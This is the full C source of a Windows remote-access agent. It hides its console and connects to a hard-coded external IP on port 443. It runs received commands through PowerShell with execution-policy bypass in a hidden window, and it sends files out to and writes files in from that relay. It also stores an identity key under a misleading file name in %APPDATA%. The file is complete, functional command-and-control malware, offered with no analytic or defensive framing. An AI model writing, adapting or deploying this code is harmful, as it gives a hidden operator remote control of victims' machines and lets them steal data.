/*
 * agent_win.c — Windows version
 *
 * Compile with MSVC:
 *   cl /O2 agent_win.c ws2_32.lib advapi32.lib
 *
 * Compile with MinGW:
 *   x86_64-w64-mingw32-gcc -O2 -o agent_win.exe agent_win.c -lws2_32 -ladvapi32
 */

#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <mstcpip.h>
#include <stdio.h>

/* Fallback if mstcpip.h doesn't define these */
#ifndef SIO_KEEPALIVE_VALS
#define SIO_KEEPALIVE_VALS _WSAIOW(IOC_VENDOR,4)
struct tcp_keepalive_compat { ULONG onoff; ULONG keepalivetime; ULONG keepaliveinterval; };
#define TCP_KA_STRUCT struct tcp_keepalive_compat
#else
#define TCP_KA_STRUCT struct tcp_keepalive
#endif
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <direct.h>
#include <io.h>
#include <process.h>
#include <shlobj.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")

/* ============================================================================
 * Configuration
 * ========================================================================== */
#define RELAY_HOST   "103.91.140.22"
#define SVR_PORT     443
#define UL_PORT      7334

#define BUF          131072
#define KEY_FILE_NAME "glibform.dat"

#define KEEPALIVE_INTERVAL_SEC  30
#define CONNECT_TIMEOUT_SEC     10
#define BACKOFF_INITIAL_SEC     1
#define BACKOFF_MAX_SEC         60
#define BACKOFF_MULTIPLIER      2
#define CMD_TIMEOUT_SEC         25

#define ACCUM_CAP    (256 * 1024)

/* ============================================================================
 * Globals
 * ========================================================================== */
static char aid[128];
static volatile int g_running = 1;

/* ============================================================================
 * Console ctrl handler (graceful shutdown)
 * ========================================================================== */
static BOOL WINAPI ctrl_handler(DWORD type) {
    (void)type;
    g_running = 0;
    return TRUE;
}

/* ============================================================================
 * Accumulation buffer
 * ========================================================================== */
typedef struct {
    char  *data;
    size_t len;
    size_t cap;
} accum_t;

static accum_t accum;

static void accum_init(void) {
    accum.data = (char *)malloc(ACCUM_CAP);
    if (!accum.data) exit(1);
    accum.len = 0;
    accum.cap = ACCUM_CAP;
}

static void accum_reset(void) { accum.len = 0; }

static int accum_getline(char *out, int mx) {
    size_t i;
    for (i = 0; i < accum.len; i++) {
        if (accum.data[i] == '\n') {
            int copy = ((int)i < mx - 1) ? (int)i : mx - 1;
            memcpy(out, accum.data, copy);
            out[copy] = '\0';
            size_t rest = accum.len - i - 1;
            if (rest > 0) memmove(accum.data, accum.data + i + 1, rest);
            accum.len = rest;
            return 1;
        }
    }
    return 0;
}

static int accum_recv(SOCKET fd) {
    if (accum.len >= accum.cap) { accum.len = 0; return -2; }
    int n = recv(fd, accum.data + accum.len, (int)(accum.cap - accum.len), 0);
    if (n > 0) { accum.len += n; return n; }
    if (n == 0) return 0;
    int err = WSAGetLastError();
    if (err == WSAEWOULDBLOCK) return -1;
    return -2;
}

/* ============================================================================
 * Key persistence — stored in %APPDATA%
 * ========================================================================== */
static void get_key_path(char *out, int mx) {
    char appdata[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata) == S_OK) {
        _snprintf(out, mx, "%s\\%s", appdata, KEY_FILE_NAME);
    } else {
        _snprintf(out, mx, "C:\\%s", KEY_FILE_NAME);
    }
}

static void generate_random_key(char *out) {
    HCRYPTPROV prov;
    unsigned char buf[16];
    if (CryptAcquireContextA(&prov, NULL, NULL, PROV_RSA_FULL,
                             CRYPT_VERIFYCONTEXT)) {
        CryptGenRandom(prov, 16, buf);
        CryptReleaseContext(prov, 0);
    } else {
        srand((unsigned)(time(NULL) ^ GetCurrentProcessId()));
        for (int i = 0; i < 16; i++) buf[i] = rand() & 0xFF;
    }
    for (int i = 0; i < 16; i++)
        sprintf(out + i * 2, "%02x", buf[i]);
    out[32] = '\0';
}

static void load_secret_key(void) {
    const char *env_key = getenv("AGENT_SECRET_KEY");
    if (env_key && strlen(env_key) >= 16) {
        strncpy(aid, env_key, sizeof(aid) - 1);
        aid[sizeof(aid) - 1] = '\0';
        return;
    }

    char kpath[MAX_PATH];
    get_key_path(kpath, MAX_PATH);

    FILE *f = fopen(kpath, "r");
    if (f) {
        char buf[128] = {0};
        if (fgets(buf, sizeof(buf), f)) {
            buf[strcspn(buf, "\r\n")] = '\0';
            if (strlen(buf) >= 16) {
                strncpy(aid, buf, sizeof(aid) - 1);
                aid[sizeof(aid) - 1] = '\0';
                fclose(f);
                return;
            }
        }
        fclose(f);
    }

    generate_random_key(aid);
    f = fopen(kpath, "w");
    if (f) { fprintf(f, "%s\n", aid); fclose(f); }
}

/* ============================================================================
 * JSON helpers (same as Linux version)
 * ========================================================================== */
static int jesc(const char *s, char *d, int mx) {
    int i = 0, j = 0;
    for (; s[i] && j < mx - 8; i++) {
        unsigned char c = (unsigned char)s[i];
        switch (s[i]) {
            case '\\': d[j++] = '\\'; d[j++] = '\\'; break;
            case '"':  d[j++] = '\\'; d[j++] = '"';  break;
            case '\n': d[j++] = '\\'; d[j++] = 'n';  break;
            case '\r': d[j++] = '\\'; d[j++] = 'r';  break;
            case '\t': d[j++] = '\\'; d[j++] = 't';  break;
            default:
                if (c < 0x20) {
                    j += _snprintf(d + j, 7, "\\u%04x", c);
                } else {
                    d[j++] = s[i];
                }
        }
    }
    d[j] = 0;
    return j;
}

static int jget(const char *j, const char *k, char *v, int mx) {
    char pat[128];
    _snprintf(pat, 128, "\"%s\":\"", k);
    char *p = strstr(j, pat);
    if (!p) {
        _snprintf(pat, 128, "\"%s\":", k);
        p = strstr(j, pat);
        if (!p) return 0;
        p += (int)strlen(pat);
        int i = 0;
        while (*p && *p != ',' && *p != '}' && i < mx - 1) v[i++] = *p++;
        v[i] = 0;
        return i;
    }
    p += (int)strlen(pat);
    int i = 0;
    while (*p && *p != '"' && i < mx - 1) {
        if (*p == '\\' && *(p + 1)) {
            p++;
            switch (*p) {
                case 'n': v[i++] = '\n'; break;
                case 'r': v[i++] = '\r'; break;
                case 't': v[i++] = '\t'; break;
                default:  v[i++] = *p;
            }
        } else v[i++] = *p;
        p++;
    }
    v[i] = 0;
    return i;
}

/* ============================================================================
 * I/O helpers
 * ========================================================================== */
static int fullwrite(SOCKET fd, const void *buf, int len) {
    int s = 0;
    while (s < len) {
        int w = send(fd, (const char *)buf + s, len - s, 0);
        if (w == SOCKET_ERROR) {
            int err = WSAGetLastError();
            if (err == WSAEWOULDBLOCK) { Sleep(1); continue; }
            return -1;
        }
        if (w == 0) return -1;
        s += w;
    }
    return s;
}

static int tsend(SOCKET fd, const char *msg) {
    int len = (int)strlen(msg);
    char *buf = (char *)malloc(len + 2);
    if (!buf) return -1;
    memcpy(buf, msg, len);
    buf[len] = '\n';
    int r = fullwrite(fd, buf, len + 1);
    free(buf);
    return r;
}

static int blocking_readline(SOCKET fd, char *buf, int mx) {
    int t = 0;
    while (t < mx - 1) {
        int n = recv(fd, buf + t, 1, 0);
        if (n <= 0) return -1;
        if (buf[t] == '\n') { buf[t] = 0; return t; }
        t++;
    }
    buf[t] = 0;
    return t;
}

/* ============================================================================
 * Command execution — CreateProcess with pipes
 * ========================================================================== */
static int run_command(const char *cmd, char *out, int mx) {
    SECURITY_ATTRIBUTES sa;
    HANDLE hReadPipe, hWritePipe;
    PROCESS_INFORMATION pi;
    STARTUPINFOA si;
    DWORD exitCode = 0;
    int total = 0;

    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        out[0] = 0;
        return 127;
    }
    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    si.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    ZeroMemory(&pi, sizeof(pi));

    /* Build command line: cmd.exe /c "command" */
    char cmdline[BUF];
    _snprintf(cmdline, sizeof(cmdline),
    "powershell.exe -NoP -NonI -Ep Bypass -C \"%s\"", cmd);

    if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        out[0] = 0;
        return 127;
    }
    CloseHandle(hWritePipe);

    /* Read output with timeout */
    DWORD deadline = GetTickCount() + (CMD_TIMEOUT_SEC * 1000);

    while (total < mx - 1) {
        DWORD avail = 0;
        if (!PeekNamedPipe(hReadPipe, NULL, 0, NULL, &avail, NULL)) break;

        if (avail > 0) {
            DWORD toRead = (avail < (DWORD)(mx - total - 1)) ? avail : (DWORD)(mx - total - 1);
            DWORD bytesRead = 0;
            if (ReadFile(hReadPipe, out + total, toRead, &bytesRead, NULL) && bytesRead > 0) {
                total += bytesRead;
            } else break;
        } else {
            /* Check if process exited */
            DWORD wait = WaitForSingleObject(pi.hProcess, 10);
            if (wait == WAIT_OBJECT_0) {
                /* Process done — drain remaining */
                while (total < mx - 1) {
                    DWORD bytesRead = 0;
                    if (!ReadFile(hReadPipe, out + total, mx - total - 1, &bytesRead, NULL) || bytesRead == 0)
                        break;
                    total += bytesRead;
                }
                break;
            }
            if (GetTickCount() >= deadline) {
                TerminateProcess(pi.hProcess, 1);
                break;
            }
            Sleep(1);
        }
    }

    GetExitCodeProcess(pi.hProcess, &exitCode);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hReadPipe);

    /* Replace NUL bytes */
    for (int i = 0; i < total; i++) {
        if (out[i] == '\0') out[i] = ' ';
    }
    out[total] = '\0';

    return (int)exitCode;
}

/* ============================================================================
 * File download — threaded (agent → relay → browser)
 * ========================================================================== */
struct dl_args {
    char path[4096];
    char dl_id[64];
};

static DWORD WINAPI download_thread(LPVOID arg) {
    struct dl_args *da = (struct dl_args *)arg;
    SOCKET fd;
    struct sockaddr_in sv;
    char hdr[256], buf[65536];
    HANDLE hFile;
    LARGE_INTEGER fsize;

    hFile = CreateFileA(da->path, GENERIC_READ, FILE_SHARE_READ,
                        NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) { free(da); return 1; }
    GetFileSizeEx(hFile, &fsize);

    fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd == INVALID_SOCKET) { CloseHandle(hFile); free(da); return 1; }

    memset(&sv, 0, sizeof(sv));
    sv.sin_family = AF_INET;
    sv.sin_port = htons(SVR_PORT);
    inet_pton(AF_INET, RELAY_HOST, &sv.sin_addr);

    if (connect(fd, (struct sockaddr *)&sv, sizeof(sv)) != 0) {
        closesocket(fd); CloseHandle(hFile); free(da); return 1;
    }

    int sndbuf = 262144;
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, (char *)&sndbuf, sizeof(sndbuf));

    _snprintf(hdr, sizeof(hdr), "FILE:%s:%lld\n", da->dl_id, fsize.QuadPart);
    if (fullwrite(fd, hdr, (int)strlen(hdr)) < 0) {
        closesocket(fd); CloseHandle(hFile); free(da); return 1;
    }

    DWORD bytesRead;
    while (ReadFile(hFile, buf, sizeof(buf), &bytesRead, NULL) && bytesRead > 0) {
        if (fullwrite(fd, buf, bytesRead) < 0) break;
    }

    CloseHandle(hFile);
    closesocket(fd);
    free(da);
    return 0;
}

static void do_download(SOCKET mainfd, const char *rb) {
    char path[4096], dl_id[64], sb[BUF];
    if (!jget(rb, "path", path, sizeof(path))) return;
    if (!jget(rb, "dl_id", dl_id, sizeof(dl_id))) return;

    DWORD attr = GetFileAttributesA(path);
    if (attr == INVALID_FILE_ATTRIBUTES || (attr & FILE_ATTRIBUTE_DIRECTORY)) {
        char ep[256]; jesc(path, ep, 256);
        _snprintf(sb, BUF, "{\"action\":\"file_error\",\"dl_id\":\"%s\","
                  "\"error\":\"cannot stat: %s\"}", dl_id, ep);
        tsend(mainfd, sb);
        return;
    }

    _snprintf(sb, BUF, "{\"action\":\"file_ack\",\"dl_id\":\"%s\"}", dl_id);
    tsend(mainfd, sb);

    struct dl_args *da = (struct dl_args *)malloc(sizeof(struct dl_args));
    if (!da) return;
    strncpy(da->path, path, sizeof(da->path) - 1);
    strncpy(da->dl_id, dl_id, sizeof(da->dl_id) - 1);

    HANDLE t = CreateThread(NULL, 0, download_thread, da, 0, NULL);
    if (t) CloseHandle(t);
    else free(da);
}

/* ============================================================================
 * File upload — threaded (relay → agent disk)
 * ========================================================================== */
struct ul_args {
    char path[4096];
    char ul_id[64];
};

static DWORD WINAPI upload_thread(LPVOID arg) {
    struct ul_args *ua = (struct ul_args *)arg;
    SOCKET fd;
    struct sockaddr_in sv;
    char hdr[256], resp[256], buf[65536];

    fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd == INVALID_SOCKET) { free(ua); return 1; }

    memset(&sv, 0, sizeof(sv));
    sv.sin_family = AF_INET;
    sv.sin_port = htons(UL_PORT);
    inet_pton(AF_INET, RELAY_HOST, &sv.sin_addr);

    if (connect(fd, (struct sockaddr *)&sv, sizeof(sv)) != 0) {
        closesocket(fd); free(ua); return 1;
    }

    int rcvbuf = 262144;
    setsockopt(fd, SOL_SOCKET, SO_RCVBUF, (char *)&rcvbuf, sizeof(rcvbuf));

    _snprintf(hdr, sizeof(hdr), "UPLOAD:%s\n", ua->ul_id);
    if (fullwrite(fd, hdr, (int)strlen(hdr)) < 0) {
        closesocket(fd); free(ua); return 1;
    }

    if (blocking_readline(fd, resp, sizeof(resp)) < 0 ||
        strncmp(resp, "SIZE:", 5) != 0) {
        closesocket(fd); free(ua); return 1;
    }

    long long fsize = _atoi64(resp + 5);
    if (fsize <= 0) { closesocket(fd); free(ua); return 1; }

    /* Create parent directory */
    char tmp[4096];
    strncpy(tmp, ua->path, sizeof(tmp) - 1);
    tmp[sizeof(tmp) - 1] = 0;
    char *slash = strrchr(tmp, '\\');
    if (!slash) slash = strrchr(tmp, '/');
    if (slash && slash != tmp) {
        *slash = 0;
        /* Recursively create dirs */
        char mkdir_cmd[4200];
        _snprintf(mkdir_cmd, sizeof(mkdir_cmd), "mkdir \"%s\" 2>nul", tmp);
        system(mkdir_cmd);
    }

    FILE *fp = fopen(ua->path, "wb");
    if (!fp) {
        fullwrite(fd, "FAIL:fopen\n", 11);
        closesocket(fd); free(ua); return 1;
    }

    long long remain = fsize;
    while (remain > 0) {
        int want = (remain < (long long)sizeof(buf)) ? (int)remain : (int)sizeof(buf);
        int n = recv(fd, buf, want, 0);
        if (n <= 0) break;
        if (fwrite(buf, 1, n, fp) != (size_t)n) { remain = -1; break; }
        remain -= n;
    }
    fflush(fp);
    fclose(fp);

    if (remain == 0) {
        fullwrite(fd, "OK\n", 3);
    } else {
        char f[64];
        _snprintf(f, 64, "FAIL:remain=%lld\n", remain);
        fullwrite(fd, f, (int)strlen(f));
        DeleteFileA(ua->path);
    }

    closesocket(fd);
    free(ua);
    return 0;
}

static void do_upload(SOCKET mainfd, const char *rb) {
    char path[4096], ul_id[64], filename[1024], sb[BUF];
    if (!jget(rb, "ul_id", ul_id, sizeof(ul_id))) return;
    if (!jget(rb, "path", path, sizeof(path))) return;
    jget(rb, "filename", filename, sizeof(filename));

    int plen = (int)strlen(path);
    if (plen > 0 && (path[plen - 1] == '/' || path[plen - 1] == '\\')) {
        if (filename[0] && plen + (int)strlen(filename) < (int)sizeof(path) - 1)
            strcat(path, filename);
    }

    _snprintf(sb, BUF, "{\"action\":\"file_ack\",\"ul_id\":\"%s\"}", ul_id);
    tsend(mainfd, sb);

    struct ul_args *ua = (struct ul_args *)malloc(sizeof(struct ul_args));
    if (!ua) return;
    strncpy(ua->path, path, sizeof(ua->path) - 1);
    strncpy(ua->ul_id, ul_id, sizeof(ua->ul_id) - 1);

    HANDLE t = CreateThread(NULL, 0, upload_thread, ua, 0, NULL);
    if (t) CloseHandle(t);
    else free(ua);
}

/* ============================================================================
 * Message dispatch
 * ========================================================================== */
static int dispatch_message(SOCKET fd, const char *rb) {
    char cmd[BUF], sb[BUF];
    static char *out = NULL, *ec = NULL, *eo = NULL;

    if (!out) {
        out = (char *)malloc(BUF);
        ec  = (char *)malloc(BUF);
        eo  = (char *)malloc(BUF);
        if (!out || !ec || !eo) exit(1);
    }

    if (strstr(rb, "\"download\"")) { do_download(fd, rb); return 0; }
    if (strstr(rb, "\"upload\""))   { do_upload(fd, rb);   return 0; }
    if (strstr(rb, "\"ping\"") || strstr(rb, "\"pong\"")) {
        tsend(fd, "{\"action\":\"pong\"}");
        return 0;
    }
    if (!strstr(rb, "\"command\"")) return 0;
    if (!jget(rb, "command", cmd, BUF)) return 0;

    /* Fix TM marker: terminal.php uses '; echo' (bash syntax).
     * Windows cmd.exe uses '&' as command separator, not ';'. */


    int ex = run_command(cmd, out, BUF);

    jesc(cmd, ec, BUF);
    jesc(out, eo, BUF);

    _snprintf(sb, BUF,
        "{\"action\":\"result\",\"agent_id\":\"%s\","
        "\"command\":\"%s\",\"output\":\"%s\",\"exit_code\":%d}",
        aid, ec, eo, ex);

    int sr = tsend(fd, sb);
    return (sr < 0) ? -1 : 0;
}

/* ============================================================================
 * Networking helpers
 * ========================================================================== */
static void set_nonblocking(SOCKET fd) {
    u_long mode = 1;
    ioctlsocket(fd, FIONBIO, &mode);
}

static void set_blocking(SOCKET fd) {
    u_long mode = 0;
    ioctlsocket(fd, FIONBIO, &mode);
}

static void set_tcp_keepalive(SOCKET fd) {
    BOOL yes = TRUE;
    setsockopt(fd, SOL_SOCKET, SO_KEEPALIVE, (char *)&yes, sizeof(yes));
    /* Windows TCP keepalive tuning */
    TCP_KA_STRUCT ka;
    DWORD ret;
    ka.onoff = 1;
    ka.keepalivetime = 30000;
    ka.keepaliveinterval = 10000;
    WSAIoctl(fd, SIO_KEEPALIVE_VALS, &ka, sizeof(ka), NULL, 0, &ret, NULL, NULL);
}

static SOCKET start_connect(void) {
    SOCKET fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd == INVALID_SOCKET) return INVALID_SOCKET;

    set_nonblocking(fd);
    set_tcp_keepalive(fd);

    struct sockaddr_in sv;
    memset(&sv, 0, sizeof(sv));
    sv.sin_family = AF_INET;
    sv.sin_port = htons(SVR_PORT);
    inet_pton(AF_INET, RELAY_HOST, &sv.sin_addr);

    int ret = connect(fd, (struct sockaddr *)&sv, sizeof(sv));
    if (ret == 0) return fd;
    int err = WSAGetLastError();
    if (err == WSAEWOULDBLOCK) return fd;

    closesocket(fd);
    return INVALID_SOCKET;
}

static int finish_connect(SOCKET fd) {
    int err = 0;
    int el = sizeof(err);
    getsockopt(fd, SOL_SOCKET, SO_ERROR, (char *)&err, &el);
    if (err) return -1;

    set_blocking(fd);

    /* Set timeouts for auth */
    DWORD tv = 5000;
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, (char *)&tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, (char *)&tv, sizeof(tv));

    char buf[512];
    _snprintf(buf, sizeof(buf), "{\"action\":\"auth\",\"agent_id\":\"%s\"}\n", aid);
    if (tsend(fd, buf) < 0) return -1;

    int n = recv(fd, buf, sizeof(buf) - 1, 0);
    if (n <= 0) return -1;
    buf[n] = '\0';

    set_nonblocking(fd);
    tv = 0;
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, (char *)&tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, (char *)&tv, sizeof(tv));

    return 0;
}

/* ============================================================================
 * Main — select-based reactor loop
 * ========================================================================== */
int main(int argc, char *argv[]) {
    (void)argc; (void)argv;

    /* Init Winsock */
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 1;

    SetConsoleCtrlHandler(ctrl_handler, TRUE);

    /* Hide console window */
    HWND hw = GetConsoleWindow();
    if (hw) ShowWindow(hw, SW_HIDE);

    load_secret_key();
    if (!aid[0]) return 1;

    accum_init();

    SOCKET sock_fd = INVALID_SOCKET;
    int backoff_sec = BACKOFF_INITIAL_SEC;
    DWORD last_ka = GetTickCount();
    DWORD connect_deadline = 0;
    DWORD backoff_deadline = 0;
    int connecting = 0;

    /* Initial connection */
    sock_fd = start_connect();
    if (sock_fd != INVALID_SOCKET) {
        connecting = 1;
        connect_deadline = GetTickCount() + (CONNECT_TIMEOUT_SEC * 1000);
    }

    /* Reactor loop */
    while (g_running) {
        fd_set rfds, wfds;
        struct timeval tv;
        tv.tv_sec = 0;
        tv.tv_usec = 50000; /* 50ms tick */

        FD_ZERO(&rfds);
        FD_ZERO(&wfds);

        if (sock_fd != INVALID_SOCKET) {
            if (connecting)
                FD_SET(sock_fd, &wfds);
            else
                FD_SET(sock_fd, &rfds);
        }

        int sel = select(0, &rfds, &wfds, NULL, &tv);
        DWORD now = GetTickCount();

        /* Handle connect timeout / backoff */
        if (sock_fd == INVALID_SOCKET && !connecting) {
            /* Need to reconnect — check if backoff expired */
            if (backoff_deadline == 0) backoff_deadline = now + (backoff_sec * 1000);
            if (now >= backoff_deadline) {
                sock_fd = start_connect();
                if (sock_fd != INVALID_SOCKET) {
                    connecting = 1;
                    connect_deadline = now + (CONNECT_TIMEOUT_SEC * 1000);
                    backoff_sec = BACKOFF_INITIAL_SEC;
                } else {
                    backoff_sec *= BACKOFF_MULTIPLIER;
                    if (backoff_sec > BACKOFF_MAX_SEC) backoff_sec = BACKOFF_MAX_SEC;
                }
                backoff_deadline = now + (backoff_sec * 1000);
            }
            continue;
        }

        /* Connecting — check write ready or timeout */
        if (connecting && sock_fd != INVALID_SOCKET) {
            if (FD_ISSET(sock_fd, &wfds)) {
                if (finish_connect(sock_fd) < 0) {
                    closesocket(sock_fd);
                    sock_fd = INVALID_SOCKET;
                    connecting = 0;
                    backoff_deadline = 0;
                    backoff_sec *= BACKOFF_MULTIPLIER;
                    if (backoff_sec > BACKOFF_MAX_SEC) backoff_sec = BACKOFF_MAX_SEC;
                    continue;
                }
                connecting = 0;
                accum_reset();
                last_ka = now;
                backoff_sec = BACKOFF_INITIAL_SEC;
            } else if (now >= connect_deadline) {
                closesocket(sock_fd);
                sock_fd = INVALID_SOCKET;
                connecting = 0;
                backoff_deadline = 0;
                backoff_sec *= BACKOFF_MULTIPLIER;
                if (backoff_sec > BACKOFF_MAX_SEC) backoff_sec = BACKOFF_MAX_SEC;
            }
            continue;
        }

        /* Connected — read data */
        if (sock_fd != INVALID_SOCKET && FD_ISSET(sock_fd, &rfds)) {
            int rc = accum_recv(sock_fd);
            if (rc == 0 || rc == -2) {
                closesocket(sock_fd);
                sock_fd = INVALID_SOCKET;
                connecting = 0;
                backoff_deadline = 0;
                continue;
            }

            char *rb = (char *)malloc(BUF);
            if (!rb) { g_running = 0; break; }

            while (accum_getline(rb, BUF)) {
                if (rb[0] == '\0') continue;

                /* Set blocking for command execution send */
                set_blocking(sock_fd);
                if (dispatch_message(sock_fd, rb) < 0) {
                    closesocket(sock_fd);
                    sock_fd = INVALID_SOCKET;
                    connecting = 0;
                    backoff_deadline = 0;
                    break;
                }
                set_nonblocking(sock_fd);
                last_ka = now;
            }
            free(rb);
        }

        /* Keepalive */
        if (sock_fd != INVALID_SOCKET && !connecting &&
            KEEPALIVE_INTERVAL_SEC > 0 &&
            (now - last_ka) >= (DWORD)(KEEPALIVE_INTERVAL_SEC * 1000)) {
            set_blocking(sock_fd);
            if (tsend(sock_fd, "{\"action\":\"ping\"}") < 0) {
                closesocket(sock_fd);
                sock_fd = INVALID_SOCKET;
                connecting = 0;
                backoff_deadline = 0;
            } else {
                set_nonblocking(sock_fd);
                last_ka = now;
            }
        }
    }

    if (sock_fd != INVALID_SOCKET) closesocket(sock_fd);
    free(accum.data);
    WSACleanup();
    return 0;
}
